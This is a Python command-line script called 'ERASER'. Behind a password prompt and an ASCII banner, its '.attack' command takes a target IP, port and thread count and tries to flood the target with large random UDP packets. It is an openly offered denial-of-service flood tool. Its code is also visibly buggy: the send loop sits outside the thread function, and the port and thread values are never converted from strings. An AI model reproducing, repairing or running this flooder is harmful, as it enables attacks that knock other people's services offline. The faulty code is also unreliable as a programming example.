from colorama import Fore, Back
import random, time, socket, os, threading

os.system("cls" if os.name == "nt" else "clear")
key = input("🔑 Key: ")

if key == "gujassperma":
    pass
else:
    print("Araswori Key 💀")

os.system("cls" if os.name == "nt" else "clear")

welcome = """
░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓████████▓▒░░▒▓██████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                Try Help                                                                                                                                
"""
print(welcome)

while True:
    eraser = input("@ERASER>>>> ")

    if eraser == "Help" or eraser == "HELP" or eraser == "help":
        print("""
┌─────────────────────────────────────────────┐
|        .cls -  for terminal clearing        |
|        .exit - for exit                     |
|        .attack - for attacking              |
└─────────────────────────────────────────────┘
""")
    
    elif eraser == ".exit" or eraser == ".Exit" or eraser == ".EXIT":
        exit()

    elif eraser == ".cls" or eraser == ".Cls" or eraser == ".CLS":
        os.system("cls" if os.name == "nt" else "clear")
        print(welcome)

    elif eraser == ".attack" or eraser == ".Attack":
            ip = input("🦍IP ADDRESS: ")
            port = input("💻PORT: ")
            threads = input("🧵AMOUNT OF THREADS: ")



            def attack():
                attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                attack.connect((ip, port))

            for i in range(1, 100 * 1000):
                try:
                    attack.send(random._urandom(10) * 1000)
                except ConnectionRefusedError:
                    pass
            print(f"Send: {i}", end='\r')

            for i in range(threads):
             t = threading.Thread(target=attack)
             t.start()